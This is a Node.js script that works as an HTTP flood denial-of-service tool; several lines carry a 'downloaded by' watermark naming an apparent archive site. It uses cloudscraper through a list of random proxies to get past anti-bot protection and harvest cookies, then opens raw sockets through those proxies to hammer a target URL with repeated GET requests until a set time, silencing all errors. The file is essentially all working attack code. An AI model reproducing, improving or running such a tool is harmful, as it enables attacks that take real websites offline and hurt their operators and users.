const EventEmitter = require('events'); // downloaded by www.b4ckdoorarchive.host
const emitter = new EventEmitter(); // downloaded by www.b4ckdoorarchive.host
emitter.setMaxListeners(Number.POSITIVE_INFINITY); // downloaded by www.b4ckdoorarchive.host
var fs = require('fs'); // downloaded by www.b4ckdoorarchive.host
let net = require('net'); // downloaded by www.b4ckdoorarchive.host
var proxies = fs.readFileSync(process.argv[4], 'utf-8').replace(/\r/g, '').split('\n'); // downloaded by www.b4ckdoorarchive.host

process.on('uncaughtException', function (err) { // downloaded by www.b4ckdoorarchive.host
//  console.log(err);
});

process.on('unhandledRejection', function (err) { // downloaded by www.b4ckdoorarchive.host
//  console.log(err);
});

var cloudscraper = require('cloudscraper');
const url = require('url');
var p = process.argv[2];
var target = p.replace('https', 'http');
var time = process.argv[3];
var { host } = url.parse(target);
var { path } = url.parse(target);
let cookies = [];

setInterval(() => {
  let proxy = proxies[Math.floor(Math.random() * proxies.length)];
  cloudscraper.get({
    url: target,
    proxy: 'http://' + proxy
  }, function (error, response) {
    if (response && response.request.headers.cookie) {
      let cookie = response.request.headers.cookie;
      let ua = response.request.headers['User-Agent'];
      cookies.push({ cookie, ua, proxy });
    }
  });
});
var counter = 0;

function send(cookie, proxy, ua) {
  let [ip, port] = proxy.split(':');
  var s = net.Socket();

  s.connect(port, ip);

  s.once('error', err => {
    console.log('Error : ' + ip + ":" + port);
  });

  s.once('disconnect', () => {
    console.log('Disconnect');
  });

  s.once('data', data => {
    console.log('Connected : ' + ip + ":" + port + " : " + cookie);
    setTimeout(() => {
      s.destroy();
      delete s;
      send(cookie, proxy, ua);
    }, 5000);
  });

  for (var i = 0; i < 7; i++) {
    s.write('GET ' + path + ' HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nCookie: ' + cookie + '\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\n\r\n');
  }
}

var int = setInterval(() => {
  cookies.forEach(json => {
    send(json.cookie, json.proxy, json.ua);
  });
}, 3);

setTimeout(() => {
    process.exit(1);
}, time * 1000);